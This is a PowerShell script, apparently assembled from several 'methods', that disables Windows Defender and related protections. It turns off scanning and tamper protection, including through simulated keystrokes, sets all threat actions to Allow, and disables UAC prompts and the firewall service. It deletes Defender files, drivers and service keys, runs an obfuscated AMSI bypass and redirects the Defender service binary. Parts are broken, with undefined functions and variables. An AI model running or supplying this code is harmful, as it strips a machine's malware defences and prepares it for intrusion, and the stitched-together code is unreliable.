#disable realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue

#disable uac
    Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
    #disable tamper protection
$TamperProtectionEnabled = (Get-MpPreference).TamperProtection
if ($TamperProtectionEnabled -eq 1) {
        $shell = New-Object -ComObject WScript.Shell
$shell.SendKeys("^{ESC}")
Start-Sleep -Seconds 1
$shell.SendKeys("Tamper Protection")
Start-Sleep -Seconds 1
$shell.SendKeys("{ENTER}")
Start-Sleep -Seconds 2
1..4 | ForEach-Object {
    $shell.SendKeys("{TAB}")
    Start-Sleep -Milliseconds 100
}
$shell.SendKeys(" ")
Start-Sleep -Seconds 1
$shell.SendKeys("{RIGHT}")
$shell.SendKeys("%y")
$shell.SendKeys("{ENTER}")
$shell.SendKeys("%{F4}")
}

# Disable Tamper Protection
Start-Process -FilePath "reg.exe" -ArgumentList "add 'HKLM\SOFTWARE\Microsoft\Windows Defender\Features' /v TamperProtection /t REG_DWORD /d 4 /f" -Verb RunAs -Wait
Start-Process -FilePath "reg.exe" -ArgumentList "add 'HKLM\SOFTWARE\Microsoft\Windows Defender\Features' /v TamperProtectionSource /t REG_DWORD /d 2 /f" -Verb RunAs -Wait
Start-Process -FilePath "reg.exe" -ArgumentList "add 'HKLM\SOFTWARE\Microsoft\Windows Defender\Features' /v SenseDevMode /t REG_DWORD /d 0 /f" -Verb RunAs -Wait

    #method 1
    Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true
    
    #method 2
Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue

Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue

$svc_list = @("WdNisSvc", "WinDefend", "Sense")
foreach($svc in $svc_list) {
    if($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc")) {
        if( $(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc").Start -eq 4) {
        } else {
            Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" -Name Start -Value 4
        }
    }
}

$drv_list = @("WdnisDrv", "wdfilter", "wdboot")
foreach($drv in $drv_list) {
    if($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv")) {
        if( $(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv").Start -eq 4) {
        } else {
            Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv" -Name Start -Value 4
        }
    }
}

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SpyNetReporting -Value 0
        # Automatic Sample submission
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SubmitSamplesConsent -Value 0
        # Tamper protection
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 4

        # Disable in registry
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1

        Delete-Show-Error "C:\ProgramData\Windows\Windows Defender\"
        Delete-Show-Error "C:\ProgramData\Windows\Windows Defender Advanced Threat Protection\"

        # Delete drivers
        Delete-Show-Error "C:\Windows\System32\drivers\wd\"

        # Delete service registry entries
        foreach($svc in $svc_list) {
            Delete-Show-Error "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
        }

        # Delete drivers registry entries
        foreach($drv in $drv_list) {
            Delete-Show-Error "HKLM:\SYSTEM\CurrentControlSet\Services\$drv"
        }
        
    #method 3
    Set-MpPreference -DisableRealtimeMonitoring $true
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
    Get-Service -Name 'WinDefend' | Stop-Service -Verbose -WhatIf
    sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."AssEmbly"."GETTYPe"(( "{6}{3}{1}{4}{2}{0}{5}" -f 'Util','A','Amsi','.Management.','utomation.','s','System' ) )."getfiElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sETVaLUE"( ${nULl},${tRuE} )

    # Function to get the original binary path of Windows Defender
function Get-WindowsDefenderBinaryPath {
    $queryResult = sc.exe qc windefend | Select-String -Pattern "BINARY_PATH_NAME"
    $binaryPath = $queryResult -replace ".*: (.*)", '$1'
    return $binaryPath
}

# Save original binary path to a text file
$originalBinaryPath = Get-WindowsDefenderBinaryPath
$originalBinaryPath | Out-File -FilePath "$env:windir\WindowsDefenderOriginalBinaryPath.txt"

# Disable Windows Defender Real-time Monitoring and set startup type to Disabled
Set-MpPreference -DisableRealtimeMonitoring $true
Start-Sleep -Seconds 2
Get-Service WinDefend | Set-Service -StartupType Disabled

# Disable additional services
$servicesToDisable = @("mpssvc", "WdNisSvc")
foreach ($service in $servicesToDisable) {
    Start-Process -FilePath "sc.exe" -ArgumentList "config $service start= disabled" -Verb RunAs -Wait
}

# Configure binary path for Windows Defender
$bfsvcPath = "$env:windir\bfsvc.exe"
Start-Process -FilePath "sc.exe" -ArgumentList "config WinDefend binPath=`"$bfsvcPath`"" -Verb RunAs -Wait

# Run the script to hide PowerShell window and execute commands with elevated privileges
$scriptToRun = "$env:windir\script-ps.ps1"
$scriptContent = @"
iex "$restoreScriptPath"
"@
$scriptContent | Out-File -FilePath $scriptToRun -Encoding ASCII

# Run the script with AdvancedRun
Start-Process -FilePath "AdvancedRun.exe" -ArgumentList "/Run $scriptToRun" -Verb RunAs
